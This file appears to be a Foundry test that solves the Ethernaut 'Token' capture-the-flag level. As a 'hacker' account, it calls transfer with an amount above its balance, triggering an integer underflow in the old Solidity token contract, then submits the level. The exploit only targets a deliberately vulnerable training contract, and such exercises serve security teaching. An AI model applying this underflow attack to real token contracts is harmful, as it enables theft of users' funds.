// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut-06.sol";
import "src/levels/05-Token/TokenFactory.sol";

contract TokenTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(hacker, 21 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_uint("hacker balance before exploit", ethernautToken.balanceOf(hacker));
        ethernautToken.transfer(address(0), 21);
        emit log_named_uint("hacker balance after exploit", ethernautToken.balanceOf(hacker));
        emit log("Underflow happen!");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
